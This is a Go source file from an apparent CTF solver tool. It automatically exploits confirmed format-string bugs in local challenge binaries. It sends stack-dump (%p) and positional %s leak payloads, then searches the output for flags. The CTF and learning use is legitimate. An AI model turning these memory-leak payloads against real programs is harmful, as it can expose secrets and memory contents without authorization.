// Package solve attempts to recover a flag from a simple local CTF program by
// driving a confirmed vulnerability and extracting the disclosed secret.
//
// Version one implements a single strategy: format-string read. It runs only
// after internal/detect confirms input-dependent %p expansion, then sends a
// bounded set of format-string payloads and searches each transcript for a flag
// the program revealed. A flag is counted only when it is absent from the input
// that produced it, so echoing a supplied flag never registers as a solve.
package solve

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/MoriartyPuth/PwnProbes/internal/detect"
	"github.com/MoriartyPuth/PwnProbes/internal/extract"
	"github.com/MoriartyPuth/PwnProbes/internal/inspect"
	"github.com/MoriartyPuth/PwnProbes/internal/runner"
)

// MaxStackArgs bounds the direct positional reads and the stack dump width.
const MaxStackArgs = 40

// Attempt records one payload, its transcript, and the flags it recovered.
type Attempt struct {
	Strategy  string              `json:"strategy"`
	Payload   string              `json:"payload"`
	Result    runner.Result       `json:"result"`
	Candidate []extract.Candidate `json:"candidates,omitempty"`
	Recovered []string            `json:"recovered,omitempty"`
}

// Report is the full record of a solve run. Solved is true only when at least
// one non-echoed flag matching the pattern was recovered.
type Report struct {
	Binary      inspect.Report `json:"binary"`
	Detection   detect.Report  `json:"detection"`
	Pattern     string         `json:"pattern"`
	Attempts    []Attempt      `json:"attempts"`
	Solved      bool           `json:"solved"`
	Flags       []string       `json:"flags"`
	Winning     *Attempt       `json:"winning_attempt,omitempty"`
	Limitations []string       `json:"limitations"`
}

// Solve detects a vulnerability and, if the binary is a confirmed format-string
// target, attempts to read the flag. pattern selects the flag shape; an empty
// pattern uses extract.DefaultPattern. It stops at the first payload that
// recovers a non-echoed flag and reports that payload as the reproducible
// winner. It never claims success from a crash or from echoed input.
func Solve(ctx context.Context, path, pattern string, timeout time.Duration) (Report, error) {
	ex, err := extract.New(pattern)
	if err != nil {
		return Report{}, fmt.Errorf("compile flag pattern: %w", err)
	}
	effectivePattern := pattern
	if effectivePattern == "" {
		effectivePattern = extract.DefaultPattern
	}
	detection, err := detect.Probe(ctx, path, timeout)
	if err != nil {
		return Report{}, err
	}
	report := Report{
		Binary:    detection.Binary,
		Detection: detection,
		Pattern:   effectivePattern,
		Attempts:  []Attempt{},
		Flags:     []string{},
		Limitations: []string{
			"only the format-string read strategy is implemented",
			"a recovered flag must match the configured pattern and be absent from the payload that produced it",
			"single stdin interaction ending in EOF; menu-driven and remote targets are unsupported",
			"failure to recover a flag does not prove the target is unexploitable",
		},
	}
	if !hasFormatString(detection) {
		report.Limitations = append(report.Limitations, "no confirmed format-string behavior; no solve strategy applies")
		return report, nil
	}
	for _, p := range formatStringPayloads() {
		if err = ctx.Err(); err != nil {
			return report, err
		}
		result, runErr := runner.Run(ctx, runner.Request{Program: path, Input: []byte(p.payload), Timeout: timeout})
		if runErr != nil {
			return report, runErr
		}
		input := []byte(p.payload)
		cands := ex.Find(result.Stdout, input, "stdout")
		cands = append(cands, ex.Find(result.Stderr, input, "stderr")...)
		if decoded := extract.DecodeLeak(result.Stdout); decoded != "" {
			cands = append(cands, ex.Find(decoded, input, "stack_leak")...)
		}
		recovered := extract.Recovered(cands)
		attempt := Attempt{Strategy: p.name, Payload: p.payload, Result: result, Candidate: cands, Recovered: recovered}
		report.Attempts = append(report.Attempts, attempt)
		if len(recovered) > 0 {
			report.Solved = true
			report.Flags = recovered
			winner := attempt
			report.Winning = &winner
			return report, nil
		}
	}
	return report, nil
}

func hasFormatString(d detect.Report) bool {
	for _, f := range d.Findings {
		if f.Kind == "format_string" && f.Status == "confirmed_behavior" {
			return true
		}
	}
	return false
}

type payload struct {
	name    string
	payload string
}

// formatStringPayloads returns leak payloads in increasing aggressiveness. The
// stack dump rarely crashes and decodes to ASCII; the direct %s reads print a
// flag pointer straight to stdout but can crash on a non-pointer argument, so
// they run after the dump. Every payload is a single reproducible line.
func formatStringPayloads() []payload {
	dump := strings.Repeat("%p.", MaxStackArgs) + "\n"
	var direct strings.Builder
	for i := 1; i <= MaxStackArgs; i++ {
		fmt.Fprintf(&direct, "%%%d$s|", i)
	}
	direct.WriteByte('\n')
	return []payload{
		{"stack_dump", dump},
		{"direct_string_reads", direct.String()},
		{"leading_string_read", "%s\n"},
	}
}
